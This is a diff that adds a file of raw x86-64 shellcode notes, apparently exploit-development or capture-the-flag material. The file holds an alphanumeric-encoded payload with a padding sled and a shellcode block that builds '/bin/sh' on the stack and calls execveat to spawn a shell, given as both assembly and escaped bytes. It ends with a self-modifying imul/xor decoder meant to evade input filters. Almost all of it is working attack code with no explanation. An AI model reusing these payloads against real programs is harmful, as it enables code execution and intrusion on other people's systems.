@@ -1,0 +1,108 @@
+je 0x61 		ta
+push rax*0x3d	PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP
+H1hHWy5VQxLWWH7sSTjYPkpBt5w1	# encoded shellcode
+push rax*10		PPPPPPPPPP
+shellcode decoder
+
+taPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPH1hHWy5VQxLWWH7sSTjYPkpBt5w1PAZPAXPPATYk92WX0AAk97WX0ACk92WX0ADk92WX0AEk90WX0AFk90WX0AGk92WX0AHk90WX0AIk90WX0AJk92WX0AKk90WX0AMk92WX0ANk91WX0AQk90WX0ARk91WX0ATk90WX0AUk90WX0AWk91WX0AXk96WX0AYk91WX0AZ
+
+xor rax, rax
+mov rbx, 0xFF978CD091969DD1
+neg rbx
+push rbx
+push rsp
+pop rsi
+cdq
+push rax
+pop rdi
+mov al, 0x42
+mov ah, 0x01
+syscall
+
+H1\xc0H\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xffH\xf7\xdbST^\x99P_\xb0B\xb4\x01\x0f\x05
+
+hWy5VQxLWW7skYjCw1
+
+
+push r12
+pop rcx
+imul edi,DWORD PTR [rcx], 0x32
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x41], al
+imul edi,DWORD PTR [rcx], 0x37
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x43], al
+imul edi,DWORD PTR [rcx], 0x32
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x44], al
+imul edi,DWORD PTR [rcx], 0x32
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x45], al
+imul edi,DWORD PTR [rcx], 0x30
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x46], al
+imul edi,DWORD PTR [rcx], 0x30
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x47], al
+imul edi,DWORD PTR [rcx], 0x32
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x48], al
+imul edi,DWORD PTR [rcx], 0x30
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x49], al
+imul edi,DWORD PTR [rcx], 0x30
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x4a], al
+imul edi,DWORD PTR [rcx], 0x32
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x4b], al
+imul edi,DWORD PTR [rcx], 0x30
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x4d], al
+imul edi,DWORD PTR [rcx], 0x32
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x4e], al
+imul edi,DWORD PTR [rcx], 0x31
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x51], al
+imul edi,DWORD PTR [rcx], 0x30
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x52], al
+imul edi,DWORD PTR [rcx], 0x31
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x54], al
+imul edi,DWORD PTR [rcx], 0x30
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x55], al
+imul edi,DWORD PTR [rcx], 0x30
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x57], al
+imul edi,DWORD PTR [rcx], 0x31
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x58], al
+imul edi,DWORD PTR [rcx], 0x36
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x59], al
+imul edi,DWORD PTR [rcx], 0x31
+push rdi
+pop rax
+xor BYTE PTR [rcx+0x5a], al
